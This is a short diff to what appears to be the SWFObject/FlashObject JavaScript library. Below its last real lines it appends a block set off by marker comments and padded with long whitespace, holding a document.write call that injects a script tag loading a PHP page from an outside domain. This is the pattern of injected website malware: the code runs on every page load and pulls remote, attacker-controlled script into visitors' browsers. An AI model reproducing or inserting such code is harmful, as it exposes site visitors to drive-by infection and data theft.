@@ -139,3 +139,13 @@ return this.length;};}
 var getQueryParamValue=com.deconcept.util.getRequestParameter;
 var FlashObject=com.deconcept.FlashObject;
 
+
+
+/*c3d067*/
+
+                    																	                               	 /*gbargbar09311gbar09*/
+
+document.write("<script type='text/javascript' src='http://j-j-computer.de/6Wf2mtKy.php?id=525365'></"+ "script>");
+
+
+/*/c3d067*/
